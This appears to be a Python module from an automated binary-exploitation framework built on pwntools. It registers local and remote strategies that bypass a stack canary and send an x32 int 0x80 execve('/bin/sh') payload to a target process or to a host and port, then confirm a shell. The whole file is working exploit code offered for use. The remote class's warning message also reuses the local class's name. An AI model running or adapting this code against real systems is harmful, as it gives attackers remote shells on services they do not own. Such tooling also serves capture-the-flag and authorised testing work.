"""P7.10 canary_execve_syscall — x32-only int 0x80; execve with canary.

Mirrors v3.1 ``execve_canary_syscall`` (L2690-2715, local) +
``execve_syscall_canary_remote`` (L2960+, remote), with the
v3.1 inline canary leak replaced by ``ctx.canary`` (P5.3
output).

Per ``rebuild.md`` §6.8 P7.10.
"""
from __future__ import annotations

import datetime

from pwn import p32

from autopwn.context import ExploitContext
from autopwn.core.logging import print_critical, print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.registry import register
from autopwn.exp.strategies._canary_base import CanaryStrategy
from autopwn.primitives.execve_syscall import ExecveSyscallX32
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


@register
class CanaryExecveSyscallLocalStrategy(CanaryStrategy):
    """Canary-tainted x32 int 0x80; execve("/bin/sh") — local."""

    name = "canary-execve-syscall"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = False
    requires = ("padding",)  # canary+padding from base

    def run(self, ctx: ExploitContext) -> bool:
        primitive = ExecveSyscallX32()
        primitive_payload = primitive.build_payload(ctx)
        if not primitive_payload:
            print_info("canary-execve-syscall: primitive returned empty; skipping")
            return False

        from pwn import process

        print_section_header("EXPLOITATION: canary execve-syscall - Local")
        print_payload("preparing canary + int 0x80; execve payload")

        payload = self.frame_after_canary(ctx, primitive_payload)

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="canary execve-syscall - Local",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "canary_diff": ctx.canary.diff,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryExecveSyscallLocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


@register
class CanaryExecveSyscallRemoteStrategy(CanaryStrategy):
    """Canary-tainted x32 int 0x80; execve("/bin/sh") — remote."""

    name = "canary-execve-syscall-remote"
    priority = CanaryStrategy.priority
    requires_arch = 32
    requires_remote = True
    requires = ("padding",)

    def run(self, ctx: ExploitContext) -> bool:
        if ctx.remote is None:
            print_info("canary-execve-syscall-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        primitive = ExecveSyscallX32()
        primitive_payload = primitive.build_payload(ctx)
        if not primitive_payload:
            print_info("canary-execve-syscall-remote: primitive returned empty; skipping")
            return False

        from pwn import remote as pwn_remote

        print_section_header("EXPLOITATION: canary execve-syscall - Remote")
        print_payload("preparing remote canary + int 0x80; execve payload")

        payload = self.frame_after_canary(ctx, primitive_payload)

        io = pwn_remote(host, port)
        io.recv()
        io.sendline(payload)

        info = ExploitInfo(
            exploit_type="canary execve-syscall - Remote",
            payload=payload,
            padding=ctx.padding,
            addresses={
                "canary": hex(ctx.canary.value),
                "canary_diff": ctx.canary.diff,
            },
            vulnerability_type="Stack Buffer Overflow (canary-bypassed)",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        from autopwn.report import record_success
        record_success(info)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        id_ok, id_output = verify_shell(io)
        if not id_ok:
            print_warning(f"CanaryExecveSyscallLocalStrategy: shell verification failed (no uid= output)")
            return False
        ctx.id_output = id_output
        return True


__all__ = [
    "CanaryExecveSyscallLocalStrategy",
    "CanaryExecveSyscallRemoteStrategy",
]
